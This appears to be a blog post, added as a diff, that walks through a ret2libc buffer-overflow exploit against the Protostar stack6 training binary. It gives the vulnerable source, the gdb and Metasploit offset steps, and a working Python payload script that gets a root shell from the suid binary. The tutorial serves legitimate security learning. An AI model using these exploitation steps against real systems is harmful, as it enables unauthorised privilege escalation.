@@ -1,0 +1,158 @@
+<hr />
+
+<h2 id="introduction">Introduction</h2>
+<p><br /> Hey guys , In the last post about buffer overflow we exploited a buffer overflow vulnerability where we were able to inject a shellcode and escalate privileges to root. But that was possible because we were able to overwrite the return address to another address on the stack where we placed our shellcode , but what if the stack is non-executable ? we will perform an attack called ret2libc and that’s what we are going to discuss today with protostar - stack6. Without wasting more time let’s jump right in !
+<br /> Read the <a href="/categories/#binary-exploitation">previous posts</a> if you haven’t yet.
+<img src="/images/binary-exploitation/BOF6/0.png" alt="" /></p>
+<hr />
+
+<h2 id="stack6">./stack6</h2>
+<p><br /> As always we are given the source code of the binary :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+void getpath()
+{
+        char buffer[64];
+        unsigned int ret;
+
+        printf("input path please: "); fflush(stdout);
+
+        gets(buffer);
+
+        ret = __builtin_return_address(0);
+
+        if((ret &amp; 0xbf000000) == 0xbf000000) {
+                printf("bzzzt (%p)\n", ret);
+                _exit(1);
+        }
+
+        printf("got path %s\n", buffer);
+}
+
+int main(int argc, char **argv)
+{
+        getpath();
+
+
+
+}
+</code></pre></div></div>
+<p><br /> What this code is doing is just printing <code class="highlighter-rouge">input path please:</code> then it stores our input in a buffer of 64 chars and finally it prints it out:
+<img src="/images/binary-exploitation/BOF6/1.png" alt="" />
+<br /> Our problem is this <code class="highlighter-rouge">if</code> statement :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        if((ret &amp; 0xbf000000) == 0xbf000000) {
+                printf("bzzzt (%p)\n", ret);
+                _exit(1);
+        }
+</code></pre></div></div>
+<p><br /> This is making sure that the return address is not on the stack , which makes it not possible to perform a shellcode injection like we did in the <a href="/binary-exploitation/bof5/">previous example</a>. We can defeat this by a technique called ret2libc.
+<br /></p>
+<hr />
+
+<h2 id="ret2libc">ret2libc</h2>
+<p><br /> So what is “ret2libc” ? If we take the word itself : “ret” is return , “2” means to and “libc” is the C library. The idea behind ret2libc is instead of injecting shellcode and jumping to the address that holds that shellcode we can use the functions that are already in the C library. For example we can call the function <code class="highlighter-rouge">system()</code> and make it execute <code class="highlighter-rouge">/bin/sh</code>. (Read about <code class="highlighter-rouge">system()</code> <a href="https://www.tutorialspoint.com/c_standard_library/c_function_system.htm">here</a>). We will also need to use the function <code class="highlighter-rouge">exit()</code> to make the program exit cleanly. (Read about <code class="highlighter-rouge">exit()</code> <a href="https://www.tutorialspoint.com/c_standard_library/c_function_exit.htm">here</a>).
+<br /> So finally our attack payload will be : “padding –&gt; address of <code class="highlighter-rouge">system()</code> –&gt; address of <code class="highlighter-rouge">exit()</code> –&gt; <code class="highlighter-rouge">/bin/sh</code>” instead of : “padding –&gt; new return address –&gt; NOP –&gt; shellcode”.
+<br /> Now let’s see how will we do it.
+<br /></p>
+<hr />
+
+<h2 id="exploiation">Exploiation</h2>
+<p><br /> Again , this will execute <code class="highlighter-rouge">/bin/sh</code> as root because this binary is an <code class="highlighter-rouge">suid</code> binary. If it wasn’t <code class="highlighter-rouge">suid</code> we would get a shell as the same user. We can check by using <code class="highlighter-rouge">find</code> :
+<code class="highlighter-rouge">find /opt/protostar/bin/ -perm -4000 | grep stack6</code>
+<img src="/images/binary-exploitation/BOF6/2.png" alt="" />
+<br /> As you can see <code class="highlighter-rouge">stack6</code> is an <code class="highlighter-rouge">suid</code> binary.
+<br /> So first of all , after we call <code class="highlighter-rouge">system()</code> we will need to give it <code class="highlighter-rouge">/bin/sh</code> , how will we do that ? A nice way to do it is to store <code class="highlighter-rouge">/bin/sh</code> in an environment variable. I created a variable and called it <code class="highlighter-rouge">SHELL</code> :
+<img src="/images/binary-exploitation/BOF6/3.png" alt="" />
+<br /> Now we need to find the address of that variable , we can do it from <code class="highlighter-rouge">gdb</code> by setting a breakpoint at main , then running the program and doing this : <code class="highlighter-rouge">x/s *((char **)environ+x)</code> where <code class="highlighter-rouge">x</code> is a number , This will print the address of an environment variable. We will keep trying numbers until we get the address of <code class="highlighter-rouge">SHELL</code>
+<br /> But I found a better way to do it when I was reading an article on <a href="https://www.shellblade.net/">shellblade</a>. We will use a <code class="highlighter-rouge">c</code> program to tell us the estimated address.
+<br /> Code :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+int main(int argc, char **argv)
+{
+        char *ptr = getenv("SHELL");
+        if (ptr != NULL)
+        {
+                printf("Estimated address: %p\n", ptr);
+                return 0;
+        }
+}
+</code></pre></div></div>
+<p><img src="/images/binary-exploitation/BOF6/4.png" alt="" />
+<br /> Then we will compile it : <code class="highlighter-rouge">gcc address.c -o address</code> :
+<img src="/images/binary-exploitation/BOF6/5.png" alt="" />
+<br /> As you can see it’s telling us the address of the environment variable <code class="highlighter-rouge">SHELL</code>. Now keep in mind that this is not the “exact” address and we will need to go up and down to get the right address.
+<br /> Let’s start by finding the offset. As we did before we will use <code class="highlighter-rouge">pattern_create.rb</code> and <code class="highlighter-rouge">pattern_offset.rb</code> from metasploit exploitation tools.
+<code class="highlighter-rouge">./pattern_create.rb -l 100</code>
+<img src="/images/binary-exploitation/BOF6/6.png" alt="" />
+<br /> We have our pattern now let’s run the program in gdb and set a breakpoint before main <code class="highlighter-rouge">break *main</code>. Then we will type <code class="highlighter-rouge">c</code> to continue and paste the pattern. The buffer will overflow and we will see exactly where did the overflow happen : 
+<img src="/images/binary-exploitation/BOF6/7.png" alt="" />
+<br /> We got the address <code class="highlighter-rouge">0x37634136</code> , now let’s go back and use <code class="highlighter-rouge">pattern_offset.rb</code> :
+<code class="highlighter-rouge">./pattern_offset.rb -q 0x37634136</code>
+<img src="/images/binary-exploitation/BOF6/8.png" alt="" />
+<br /> So after 80 chars the buffer overflows. Next thing to check is the addresses of <code class="highlighter-rouge">system()</code> and <code class="highlighter-rouge">exit()</code>. From gdb we will set a break point at main and type <code class="highlighter-rouge">r</code> to run the program. After it reaches the break point and breaks we can get the address of system by typing <code class="highlighter-rouge">p system</code> and we will do the same thing for exit <code class="highlighter-rouge">p exit</code> :
+<img src="/images/binary-exploitation/BOF6/9.png" alt="" />
+<br /> Address of system : <code class="highlighter-rouge">0xb7ecffb0</code>
+<br /> Address of exit : <code class="highlighter-rouge">0xb7ec60c0</code>
+<br /> Lastly we will check the address of <code class="highlighter-rouge">SHELL</code> again because it’s subject to change :
+<img src="/images/binary-exploitation/BOF6/10.png" alt="" />
+<br /> Address : <code class="highlighter-rouge">0xbffff985</code> 
+<br /> Let’s check our notes :
+<img src="/images/binary-exploitation/BOF6/11.png" alt="" />
+<br /> Ok , we are ready to write our exploit , we will use struct <code class="highlighter-rouge">import struct</code> like we did before. We will create a variable for the chars we will use to fill the buffer and call it <code class="highlighter-rouge">buffer</code> , its value will be 80 A’s.
+<code class="highlighter-rouge">buffer = "A" * 80</code>
+<br /> Then we will create 3 variables to hold the addresses of <code class="highlighter-rouge">system()</code> , <code class="highlighter-rouge">exit()</code> and <code class="highlighter-rouge">SHELL</code>. We will use struct to reverse the addresses.
+<code class="highlighter-rouge">system = struct.pack("I" ,0xb7ecffb0)</code>
+<br />
+<br />
+<code class="highlighter-rouge">exit = struct.pack("I" ,0xb7ec60c0)</code>
+<br />
+<br />
+<code class="highlighter-rouge">shell = struct.pack("I" ,0xbffff985)</code>
+<br /> And finally we will print the payload.
+<code class="highlighter-rouge">print buffer + system + exit + shell</code>
+<br /> Final script :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import struct
+
+buffer = "A" * 80
+system = struct.pack("I" ,0xb7ecffb0)
+exit = struct.pack("I" ,0xb7ec60c0)
+shell = struct.pack("I" ,0xbffff985)
+
+print buffer + system + exit + shell
+</code></pre></div></div>
+<p><img src="/images/binary-exploitation/BOF6/12.png" alt="" />
+<br /> We have to remember that the address of <code class="highlighter-rouge">SHELL</code> is not the exact address and we will need to go up or down for a little bit. We will execute the script and redirect the output to a file and name it payload. <code class="highlighter-rouge">python /tmp/stack6.py &gt; /tmp/payload</code> , Then we will cat the file and pipe the output to <code class="highlighter-rouge">./stack6</code> :
+<img src="/images/binary-exploitation/BOF6/13.png" alt="" />
+<br /> And no shell , After going up and down by editing the address in the python script I finally got the right address which is <code class="highlighter-rouge">0xbffff992</code> :
+<code class="highlighter-rouge">python /tmp/stack6.py &gt; /tmp/payload</code>
+<br />
+<br />
+<code class="highlighter-rouge">cat /tmp/payload - | ./stack6</code>
+<img src="/images/binary-exploitation/BOF6/14.png" alt="" />
+<br /> root shell!
+<br /> So after editing the address of <code class="highlighter-rouge">shell</code> variable , the script will be like this :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import struct
+
+buffer = "A" * 80
+system = struct.pack("I" ,0xb7ecffb0)
+exit = struct.pack("I" ,0xb7ec60c0)
+shell = struct.pack("I" ,0xbffff992)
+
+print buffer + system + exit + shell
+</code></pre></div></div>
+<p><img src="/images/binary-exploitation/BOF6/15.png" alt="" />
+<br />
+<br />
+<br /> That’s it , Feedback is appreciated !
+<br /> Don’t forget to read the <a href="/categories">previous articles</a> , Tweet about the article if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a>
+<br /> Thanks for reading.
+<br />
+<br />
+<br /> Previous Binary Exploitation article : <a href="/binary-exploitation/bof5/">Buffer Overflow Examples, Code execution by shellcode injection - protostar stack5</a></p>
+<hr />
+
